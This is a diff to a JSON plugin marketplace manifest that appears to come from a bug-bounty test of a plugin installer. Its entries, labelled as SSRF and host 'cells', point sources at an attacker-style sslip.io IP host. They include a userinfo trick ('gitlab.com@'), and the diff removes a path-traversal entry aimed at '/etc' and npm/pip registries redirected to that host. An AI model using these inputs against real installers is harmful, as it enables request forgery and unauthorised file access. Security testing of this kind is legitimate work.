@@ -19,7 +19,7 @@
       "description": "h1 ssrf cell",
       "source": {
         "source": "url",
-        "url": "https://78-135-87-113.sslip.io/s-url.git"
+        "url": "https://78-135-87-113.sslip.io/h1o/s-url.git"
       }
     },
     {
@@ -27,51 +27,32 @@
       "description": "h1 ssrf cell",
       "source": {
         "source": "git-subdir",
-        "url": "https://78-135-87-113.sslip.io/s-subdir.git",
+        "url": "https://78-135-87-113.sslip.io/h1o/s-subdir.git",
         "path": "p"
       }
     },
     {
-      "name": "s-urlgl",
+      "name": "s-urlnogit",
       "description": "h1 ssrf cell",
       "source": {
         "source": "url",
-        "url": "https://gitlab.com@78-135-87-113.sslip.io/s-urlgl.git"
+        "url": "https://78-135-87-113.sslip.io/h1o/s-urlnogit"
       }
     },
     {
-      "name": "s-gh",
-      "description": "h1 cell github repo",
+      "name": "s-gl",
+      "description": "h1 host cell",
       "source": {
-        "source": "github",
-        "repo": "anthropics/claude-plugins-official"
+        "source": "url",
+        "url": "https://gitlab.com/h1test-nonexist-7c41/none.git"
       }
     },
     {
-      "name": "s-ghpath",
-      "description": "h1 ssrf cell",
+      "name": "s-ghurl",
+      "description": "h1 host cell",
       "source": {
-        "source": "git-subdir",
-        "url": "https://github.com/merturl4576/h1-test-mp-738798.git",
-        "path": "../../../../etc"
-      }
-    },
-    {
-      "name": "s-npm",
-      "description": "h1 cell",
-      "source": {
-        "source": "npm",
-        "package": "h1-nonexistent-pkg-738798",
-        "registry": "https://78-135-87-113.sslip.io/npm"
-      }
-    },
-    {
-      "name": "s-pip",
-      "description": "h1 cell",
-      "source": {
-        "source": "pip",
-        "package": "h1-nonexistent-pkg-738798",
-        "index_url": "https://78-135-87-113.sslip.io/pip"
+        "source": "url",
+        "url": "https://github.com/merturl4576/h1-test-mp-738798.git"
       }
     }
   ]
